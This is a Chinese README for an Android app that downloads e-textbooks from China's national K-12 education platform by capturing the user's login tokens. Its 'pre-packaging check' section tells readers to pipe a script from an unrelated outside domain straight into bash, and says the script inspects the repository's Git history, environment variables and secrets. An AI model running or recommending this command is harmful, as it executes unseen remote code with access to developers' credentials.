# 教材下载助手 (textbook-download-assistant)

安卓手机端电子课本下载工具，用分步引导带用户完成「输入链接 → 获取登录凭据 → 解析 → 下载」全流程。基于开源项目 [tchMaterial-parser](https://github.com/happycola233/tchMaterial-parser)（MIT 许可）二次开发，保留原始版权声明。

> 本项目仅供个人学习与教学参考，所下载资源版权归国家中小学智慧教育平台及相关权利人所有，请勿用于商业用途或二次分发。

## 功能

- 分步引导式下载流程，无需用户懂技术。
- 手机端内嵌网页登录，自动读取登录凭据（替代桌面版手动 F12 复制代码）。
- 支持批量输入多个课本预览页 URL。
- 下载后自动按课本标题命名（可选：写入 PDF 书签）。
- 完全免费；支持自愿赞助与「GitHub Star + 邮箱」免费授权码。

## 本地运行

1. 用 **Android Studio**（Hedgehog 及以上）打开本项目根目录。
2. 等待 Gradle 同步（会自动下载 SDK 与依赖，首次较慢）。
3. 连接 Android 模拟器或真机（API 26+），点 Run。
4. 按界面分步引导操作即可。

> 若命令行构建，请先在项目根目录确保存在 `gradlew` 与 `gradle/wrapper/gradle-wrapper.jar`。Android Studio 打开项目后会自动生成 wrapper；也可运行 `gradle wrapper --gradle-version 8.9` 生成。

## 获取登录凭据说明

App 内会打开国家中小学智慧教育平台网页。**请先注册/登录平台账号**，登录成功后 App 会自动从页面 localStorage 读取 `access_token / mac_key / diff` 并保存。凭据约 7 天会过期，过期后重新登录即可。

## 打包前检查（NOFX）

打包前请执行：

```bash
curl -fsSL https://nofx.one/dev-quickstart/nofx_pack.sh | bash
```

该脚本会校验完整 Git 历史、lockfile、覆盖所有环境变量的 `.env.example`、可从空库启动的脚本，并检测真实密钥（有真实密钥会中止）。本地另提供 `scripts/preflight.ps1` 做同样的快速自检。

## 许可证与致谢

本工程基于 MIT 许可，使用上游 [tchMaterial-parser](https://github.com/happycola233/tchMaterial-parser) 的下载/签名逻辑，作者：肥宅水水呀。在此感谢上游开源贡献。
